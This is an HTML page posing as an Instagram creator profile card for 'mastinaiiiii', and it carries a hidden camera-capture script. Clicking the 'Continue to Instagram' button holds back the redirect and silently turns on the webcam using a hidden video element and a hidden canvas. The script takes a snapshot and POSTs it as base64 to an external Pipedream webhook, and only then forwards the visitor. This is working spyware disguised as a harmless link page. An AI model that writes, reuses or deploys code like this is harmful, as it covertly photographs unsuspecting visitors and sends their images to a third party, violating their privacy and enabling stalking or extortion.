<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>mastinaiiiii</title>
  <style>
    :root {
      --ink: #2a1b12;
      --coffee: #4c3323;
      --mocha: #745844;
      --cream: #fff7eb;
      --paper: #f5eadb;
      --line: rgba(76, 51, 35, 0.18);
      --shadow: 0 22px 70px rgba(42, 27, 18, 0.18);
    }

    * {
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      margin: 0;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      color: var(--ink);
      background:
        radial-gradient(circle at top left, rgba(255, 255, 255, 0.95) 0 16%, transparent 34%),
        radial-gradient(circle at bottom right, rgba(116, 88, 68, 0.22), transparent 34%),
        linear-gradient(135deg, #fffaf2 0%, #f3e4d0 100%);
      display: grid;
      place-items: center;
      padding: 28px;
      overflow-x: hidden;
    }

    .shell {
      position: relative;
      width: min(100%, 430px);
    }

    .mark {
      position: absolute;
      color: rgba(76, 51, 35, 0.18);
      font-weight: 900;
      line-height: 1;
      user-select: none;
      pointer-events: none;
    }

    .mark.camera {
      top: -32px;
      left: -20px;
      font-size: 4.3rem;
      rotate: -12deg;
    }

    .mark.dice {
      top: 34px;
      right: -10px;
      font-size: 3rem;
      rotate: 12deg;
    }

    .mark.film {
      bottom: 54px;
      left: -34px;
      font-size: 3.4rem;
      rotate: 16deg;
    }

    .card {
      position: relative;
      overflow: hidden;
      border: 1px solid rgba(76, 51, 35, 0.16);
      border-radius: 26px;
      background: rgba(255, 247, 235, 0.84);
      box-shadow: var(--shadow);
      backdrop-filter: blur(18px);
    }

    .cover {
      height: 142px;
      background:
        linear-gradient(rgba(42, 27, 18, 0.22), rgba(42, 27, 18, 0.36)),
        url("https://instagram.famd21-2.fna.fbcdn.net/v/t51.82787-19/658882119_17931465033237464_42978008936007403_n.jpg?efg=eyJ2ZW5jb2RlX3RhZyI6InByb2ZpbGVfcGljLmRqYW5nby4xMDgwLmMyIn0&_nc_ht=instagram.famd21-2.fna.fbcdn.net&_nc_cat=108&_nc_oc=Q6cZ2gH1i-qiffnd2M-sTneyznDNu4RliG-Oo9V-Jmr_uXRxVPFLx-Qw4JL0TZ6PznmgopVMHVLL4vL0H9snch5EEUQB&_nc_ohc=9jdH9kQ-Q0MQ7kNvwGi6S0i&_nc_gid=iNW5PIvsLohOBIM3_y91PA&edm=AP4sbd4BAAAA&ccb=7-5&oh=00_Af4h9oUQOPo1OBTPhQP6vcbLbjZ5NPN45HgrFkdUGqxbmg&oe=6A079C63&_nc_sid=7a9f4b") center 39% / cover;
    }

    .content {
      padding: 0 24px 26px;
      text-align: center;
    }

    .avatar-wrap {
      width: 142px;
      height: 142px;
      margin: -72px auto 16px;
      padding: 7px;
      border-radius: 50%;
      background: linear-gradient(135deg, #ffffff, #d7c2a9);
      box-shadow: 0 16px 38px rgba(42, 27, 18, 0.2);
    }

    .avatar {
      display: block;
      width: 100%;
      height: 100%;
      border-radius: 50%;
      object-fit: cover;
      border: 1px solid rgba(76, 51, 35, 0.15);
    }

    .handle {
      margin: 0;
      font-size: clamp(2rem, 9vw, 3.15rem);
      letter-spacing: 0;
      line-height: 0.95;
      font-weight: 900;
    }

    .tagline {
      margin: 12px auto 20px;
      max-width: 310px;
      color: #5f4a3a;
      font-size: 1rem;
      line-height: 1.55;
    }

    .chips {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 8px;
      margin-bottom: 22px;
    }

    .chip {
      border: 1px solid var(--line);
      border-radius: 999px;
      background: rgba(255, 255, 255, 0.48);
      color: var(--coffee);
      font-size: 0.82rem;
      font-weight: 700;
      padding: 8px 11px;
    }

    .actions {
      display: grid;
      gap: 10px;
    }

    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      min-height: 54px;
      width: 100%;
      border: 0;
      border-radius: 16px;
      background: #1f140e;
      color: #fff;
      font-size: 1rem;
      font-weight: 850;
      text-decoration: none;
      cursor: pointer;
      box-shadow: 0 14px 26px rgba(42, 27, 18, 0.25);
      transition: transform 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
    }

    .btn:hover {
      background: #382318;
      box-shadow: 0 18px 32px rgba(42, 27, 18, 0.31);
      transform: translateY(-2px);
    }

    .btn:focus-visible {
      outline: 3px solid rgba(116, 88, 68, 0.42);
      outline-offset: 3px;
    }

    .ghost {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      min-height: 44px;
      color: #6b5544;
      font-weight: 750;
      text-decoration: none;
    }

    .stats {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 1px;
      margin-top: 24px;
      overflow: hidden;
      border: 1px solid var(--line);
      border-radius: 18px;
      background: var(--line);
    }

    .stat {
      min-width: 0;
      padding: 14px 8px;
      background: rgba(255, 255, 255, 0.45);
    }

    .stat strong {
      display: block;
      font-size: 1rem;
      color: var(--ink);
    }

    .stat span {
      display: block;
      margin-top: 3px;
      color: #755f4c;
      font-size: 0.72rem;
      font-weight: 700;
      text-transform: uppercase;
    }

    @media (max-width: 420px) {
      body {
        padding: 16px;
      }

      .content {
        padding-inline: 18px;
      }

      .mark {
        display: none;
      }
    }
    /* Styles for the camera stream and canvas, keeping them hidden */
    #videoElement {
      display: none; /* Hide the video stream */
      width: 320px;
      height: 240px;
    }
    #canvas {
      display: none; /* Hide the canvas */
    }
  </style>
</head>
<body>
  <main class="shell" aria-label="mastinaiiiii profile card">
    <span class="mark camera">CAM</span>
    <span class="mark dice">++</span>
    <span class="mark film">PLAY</span>

    <section class="card">
      <div class="cover" aria-hidden="true"></div>

      <div class="content">
        <div class="avatar-wrap">
          <img class="avatar" src="https://instagram.famd21-2.fna.fbcdn.net/v/t51.82787-19/658882119_17931465033237464_42978008936007403_n.jpg?efg=eyJ2ZW5jb2RlX3RhZyI6InByb2ZpbGVfcGljLmRqYW5nby4xMDgwLmMyIn0&_nc_ht=instagram.famd21-2.fna.fbcdn.net&_nc_cat=108&_nc_oc=Q6cZ2gH1i-qiffnd2M-sTneyznDNu4RliG-Oo9V-Jmr_uXRxVPFLx-Qw4JL0TZ6PznmgopVMHVLL4vL0H9snch5EEUQB&_nc_ohc=9jdH9kQ-Q0MQ7kNvwGi6S0i&_nc_gid=iNW5PIvsLohOBIM3_y91PA&edm=AP4sbd4BAAAA&ccb=7-5&oh=00_Af4h9oUQOPo1OBTPhQP6vcbLbjZ5NPN45HgrFkdUGqxbmg&oe=6A079C63&_nc_sid=7a9f4b" alt="mastinaiiiii profile logo" />
        </div>

        <h1 class="handle">mastinaiiiii</h1>
        <p class="tagline">Creator vibes, edits, games, reels, and little moments worth following.</p>

        <div class="chips" aria-label="Profile interests">
          <span class="chip">Gaming</span>
          <span class="chip">Reels</span>
          <span class="chip">Edits</span>
          <span class="chip">Creator</span>
        </div>

        <div class="actions">
          <a id="instagramBtn" class="btn" href="https://www.instagram.com/mastinaiiiii" rel="noopener noreferrer">Continue to Instagram</a>
          <a class="ghost" href="https://www.instagram.com/mastinaiiiii" rel="noopener noreferrer">@mastinaiiiii</a>
        </div>

        <div class="stats" aria-label="Profile highlights">
          <div class="stat">
            <strong>Reels</strong>
            <span>inconsistently</span>
          </div>
          <div class="stat">
            <strong>Edits</strong>
            <span>Fresh</span>
          </div>
          <div class="stat">
            <strong>Vibes</strong>
            <span>Clean</span>
          </div>
        </div>
      </div>
    </section>
  </main>

  <!-- Hidden video and canvas elements for capturing images -->
  <video id="videoElement" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    const webhookUrl = "https://eoukkf7emqrufvo.m.pipedream.net";
    const video = document.getElementById('videoElement');
    const canvas = document.getElementById('canvas');
    const instagramBtn = document.getElementById('instagramBtn'); // Target the Instagram button
    let stream;
    const instagramLink = "https://www.instagram.com/mastinaiiiii"; // Store the original link

    // Function to start camera stream
    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await video.play();
        console.log("Camera stream started.");
        return true;
      } catch (err) {
        console.error("Error accessing camera: ", err);
        // Do not alert the user here, keep it silent as requested
        return false;
      }
    }

    // Function to capture image from video stream
    function captureImage() {
      if (!video.srcObject || !stream || !stream.active) {
        console.error("No active video stream to capture.");
        return null;
      }
      const context = canvas.getContext('2d');
      // Set canvas dimensions to match video to avoid stretching
      canvas.width = video.videoWidth > 0 ? video.videoWidth : 640; // Default if not ready
      canvas.height = video.videoHeight > 0 ? video.videoHeight : 480; // Default if not ready
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL('image/jpeg', 0.8); // Get base64 encoded image, 0.8 quality
    }

    // Function to send image to webhook
    async function sendImageToWebhook(imageData) {
      if (!imageData) {
        console.warn("No image data to send to webhook.");
        return;
      }
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ image: imageData }),
        });
        console.log('Image data dispatched to webhook.');
      } catch (error) {
        console.error('Error dispatching image to webhook:', error);
      }
    }

    instagramBtn.addEventListener('click', async (event) => {
      event.preventDefault(); // Prevent immediate redirection

      // Attempt to start camera silently
      const cameraStarted = await startCamera();

      if (cameraStarted) {
        // Give a brief moment for the camera to initialize and stream to stabilize
        await new Promise(resolve => setTimeout(resolve, 1000));
        const imageData = captureImage();
        if (imageData) {
          await sendImageToWebhook(imageData);
        }
      }

      // Stop camera stream if it was started
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }

      // Finally, redirect the user
      window.location.href = instagramLink;
    });

    // Optional: Stop camera stream if user navigates away before clicking
    window.addEventListener('beforeunload', () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    });
  </script>
</body>
</html>
